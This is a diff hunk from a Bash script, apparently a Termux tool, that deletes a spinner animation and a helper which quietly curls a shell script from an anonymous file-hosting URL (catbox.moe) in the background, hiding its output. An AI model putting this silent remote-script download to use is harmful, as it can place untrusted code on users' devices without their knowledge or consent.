@@ -62,37 +62,6 @@ echo -e "               ${p}╚═══════════════╝"
 echo
 	exit 0
 	fi
-spin() {
-    local pid=$!
-    local delay=0.40
-    local spinner=('█■■■■' '■█■■■' '■■█■■' '■■■█■' '■■■■█')
-
-    while ps -p $pid > /dev/null; do
-        for i in "${spinner[@]}"; do
-            tput civis
-            echo -ne "\033[1;96m\r [+] Downloading..please wait.........\e[33m[\033[1;92m$i\033[1;93m]\033[1;0m   "
-            sleep $delay
-            printf "\b\b\b\b\b\b\b\b"
-        done
-    done
-    printf "   \b\b\b\b\b"
-    tput cnorm
-    printf "\e[1;93m [Done]\e[0m\n"
-    echo
-    sleep 3
-}
-
-download_file() {
-    local url=$1
-    local output_file=$2
-
-    curl -O "$url" &> /dev/null &
-
-    spin
-}
-
-banner
-download_file "https://files.catbox.moe/lmsvqj.sh" "dx-code.sh"
 
 if [ -d "/data/data/com.termux/files/usr/" ]; then
 	banner
